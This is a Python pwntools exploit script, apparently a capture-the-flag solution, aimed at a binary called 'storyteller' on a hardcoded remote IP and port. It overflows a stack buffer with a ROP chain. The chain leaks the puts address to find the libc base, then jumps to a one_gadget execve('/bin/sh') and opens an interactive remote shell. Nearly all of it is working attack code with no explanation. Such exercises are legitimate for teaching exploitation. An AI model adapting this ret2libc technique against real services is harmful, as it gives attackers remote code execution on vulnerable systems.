#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./storyteller --host 81.94.150.171 --port 10060 --libc ./libc.so.6
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './storyteller')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '81.94.150.171'
port = int(args.PORT or 10060)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)



og1 = 0xe3afe 
# execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL || r15 is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

gift = 0x40119b

pop_rdi_gadget = p64(0x4011a2)

puts_got = p64(0x404000)
puts_plt = p64(0x401030)
main_plt = p64(0x401177)
vuln_plt = p64(0x401136)
puts_offset = 0x84420

junk = b'a'*48 + b'a'*8
payload = junk + pop_rdi_gadget + puts_got + puts_plt + vuln_plt

io = start()
io.recv()
io.sendline(payload)


l1 = io.recvline()
l2 = io.recvline()
l3 = io.recvline()

leaked_puts = u64(l2.ljust(8, b'\x00'))
leaked_puts -= 0xa000000000000
log.success('Слитый адрес puts@GLIBC (./ret2plt): %s' % hex(leaked_puts))
libc_start = leaked_puts - puts_offset

p = b'a'*48
p += b'a'*8
p += p64(gift)

p += p64(0x00)
p += p64(0x00)
p += p64(0x00)
p += p64(0x00)

p += p64(libc_start + og1)

io.sendline(p)

io.interactive()
